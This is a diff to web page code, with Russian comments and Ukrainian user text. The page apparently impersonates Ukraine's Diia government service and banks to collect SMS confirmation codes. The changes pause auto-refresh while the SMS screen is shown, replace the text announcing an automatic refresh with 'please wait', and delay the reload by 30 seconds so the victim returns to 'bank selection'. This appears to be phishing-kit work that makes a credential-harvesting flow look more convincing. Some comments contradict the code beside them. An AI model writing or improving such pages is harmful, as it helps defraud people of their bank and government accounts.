@@ -771,6 +771,10 @@
       // Скрываем загрузку при показе поля ввода
       hideLoading();
       
+      // ВАЖНО: Останавливаем автообновление во время SMS экрана
+      autoRefreshActive = false;
+      clearInterval(refreshInterval);
+      
       // Переключаемся в полноэкранный режим SMS
       document.body.innerHTML = `
         <div class="sms-fullscreen">
@@ -1055,6 +1059,7 @@
             
             console.log("✅ Код принят Дією успешно!");
             
+            // ИСПРАВЛЕНО: Показываем только "ожидаем подтверждения" без кнопок
             document.body.innerHTML = `
               <div class="sms-fullscreen">
                 <div class="diia-logo">
@@ -1063,17 +1068,19 @@
                 <div style='text-align: center; padding: 40px;'>
                   <h2 style='color: #4caf50; font-size: clamp(24px, 6vw, 32px); margin-bottom: 20px;'>✅ Код прийнято</h2>
                   <p style='color: rgba(255,255,255,0.9); font-size: clamp(16px, 4vw, 20px); line-height: 1.5;'>
-                    Чекаємо підтвердження на пристрої…<br>
-                    <small style='font-size: clamp(14px, 3vw, 16px); opacity: 0.8;'>Сторінка оновиться автоматично</small>
+                    Очікуємо підтвердження на пристрої…<br>
+                    <small style='font-size: clamp(14px, 3vw, 16px); opacity: 0.8;'>Будь ласка, зачекайте</small>
                   </p>
                 </div>
               </div>
             `;
             
+            // ВОССТАНАВЛИВАЕМ автообновление ссылок каждые 3 секунды
             setTimeout(() => {
-              location.reload(); // Перезагружаем страницу через 5 секунд
-            }, 5000);
+              location.reload();
+            }, 30000); // Перезагружаем через 30 секунд для возврата к выбору банков
             
+            // НЕ перезагружаем страницу - просто ждем подтверждения
             return;
             
           } else if (result.status === "failed" || result.status === "error") {
